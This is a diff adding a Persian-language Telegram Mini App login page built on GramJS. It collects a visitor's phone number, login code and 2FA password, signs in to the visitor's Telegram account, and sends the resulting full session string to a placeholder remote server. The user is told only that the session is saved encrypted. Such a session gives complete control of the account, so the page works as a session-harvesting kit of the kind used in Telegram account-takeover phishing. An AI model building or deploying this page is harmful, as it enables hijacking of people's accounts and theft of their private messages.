@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>ورود به اکانت</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<!-- GramJS از طریق CDN (نسخه bundle شده برای مرورگر) -->
+<script src="https://unpkg.com/telegram@2.22.2/dist/browser.js"></script>
+<style>
+  body { font-family: sans-serif; padding: 20px; background: #f5f5f5; }
+  input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
+  button { width: 100%; padding: 10px; margin-top: 8px; }
+  #status { margin-top: 12px; white-space: pre-wrap; font-size: 14px; color: #333; }
+  .step { display: none; }
+  .step.active { display: block; }
+</style>
+</head>
+<body>
+
+<h3>ورود به اکانت تلگرام</h3>
+
+<!-- این مقادیر را با API_ID و API_HASH خودتان (از my.telegram.org) جایگزین کنید -->
+<script>
+  const API_ID = 12345;                  // << جایگزین کنید
+  const API_HASH = "REPLACE_WITH_API_HASH"; // << جایگزین کنید
+  const SERVER_URL = "https://YOUR_SERVER_DOMAIN/api/save-session"; // << جایگزین کنید
+</script>
+
+<div id="step-phone" class="step active">
+  <input id="phone" type="tel" placeholder="+989123456789" />
+  <button onclick="startLogin()">ارسال کد</button>
+</div>
+
+<div id="step-code" class="step">
+  <input id="code" type="text" placeholder="کد دریافتی" />
+  <button onclick="submitCode()">تایید کد</button>
+</div>
+
+<div id="step-password" class="step">
+  <input id="password" type="password" placeholder="رمز دومرحله‌ای (2FA)" />
+  <button onclick="submitPassword()">تایید رمز</button>
+</div>
+
+<div id="status"></div>
+
+<script>
+  const { TelegramClient } = window.Telegram_ || window.telegram || {};
+  // پکیج GramJS در window با نام "window.telegram" یا export مشابه در دسترس است؛
+  // بسته به نسخه bundle ممکن است لازم باشد این خط را با کنسول مرورگر تطبیق دهید.
+
+  const tg = window.Telegram?.WebApp;
+  tg?.ready();
+
+  const StringSession = window.telegram?.sessions?.StringSession;
+  let client;
+  let phoneNumber;
+  let phoneCodeHash;
+  let resolveCode, resolvePassword;
+
+  function setStatus(msg) {
+    document.getElementById("status").innerText = msg;
+  }
+
+  function showStep(id) {
+    document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
+    document.getElementById(id).classList.add("active");
+  }
+
+  async function startLogin() {
+    phoneNumber = document.getElementById("phone").value.trim();
+    if (!phoneNumber) return;
+
+    setStatus("در حال اتصال به تلگرام...");
+
+    const session = new StringSession("");
+    client = new TelegramClient(session, API_ID, API_HASH, {
+      connectionRetries: 5,
+    });
+
+    await client.connect();
+
+    // GramJS با client.start معمولاً کل فلو را مدیریت می‌کند؛
+    // اینجا برای کنترل دستی مرحله به مرحله از invoke مستقیم استفاده می‌کنیم.
+    try {
+      const { Api } = window.telegram;
+      const result = await client.invoke(
+        new Api.auth.SendCode({
+          phoneNumber,
+          apiId: API_ID,
+          apiHash: API_HASH,
+          settings: new Api.CodeSettings({}),
+        })
+      );
+      phoneCodeHash = result.phoneCodeHash;
+      setStatus("کد ارسال شد. لطفاً آن را وارد کنید.");
+      showStep("step-code");
+    } catch (err) {
+      setStatus("خطا در ارسال کد: " + err.message);
+    }
+  }
+
+  async function submitCode() {
+    const code = document.getElementById("code").value.trim();
+    const { Api } = window.telegram;
+
+    try {
+      await client.invoke(
+        new Api.auth.SignIn({
+          phoneNumber,
+          phoneCodeHash,
+          phoneCode: code,
+        })
+      );
+      await finishLogin();
+    } catch (err) {
+      if (err.message.includes("SESSION_PASSWORD_NEEDED")) {
+        setStatus("این اکانت رمز دومرحله‌ای دارد.");
+        showStep("step-password");
+      } else {
+        setStatus("خطا: " + err.message);
+      }
+    }
+  }
+
+  async function submitPassword() {
+    const password = document.getElementById("password").value.trim();
+    try {
+      // GramJS تابع کمکی computeCheck برای هش‌کردن رمز 2FA دارد
+      const { computeCheck } = window.telegram.Password;
+      const passwordInfo = await client.invoke(new window.telegram.Api.account.GetPassword());
+      const passwordSrpCheck = await computeCheck(passwordInfo, password);
+
+      await client.invoke(
+        new window.telegram.Api.auth.CheckPassword({ password: passwordSrpCheck })
+      );
+      await finishLogin();
+    } catch (err) {
+      setStatus("رمز اشتباه بود یا خطا رخ داد: " + err.message);
+    }
+  }
+
+  async function finishLogin() {
+    const sessionString = client.session.save();
+    setStatus("ورود موفق بود. در حال ارسال session به سرور...");
+
+    const initData = tg?.initData || "";
+
+    const res = await fetch(SERVER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ initData, sessionString }),
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      setStatus("سشن با موفقیت و به‌صورت رمزنگاری‌شده ذخیره شد.");
+    } else {
+      setStatus("خطا در ذخیره سشن: " + (data.error || "نامشخص"));
+    }
+  }
+</script>
+
+</body>
+</html>
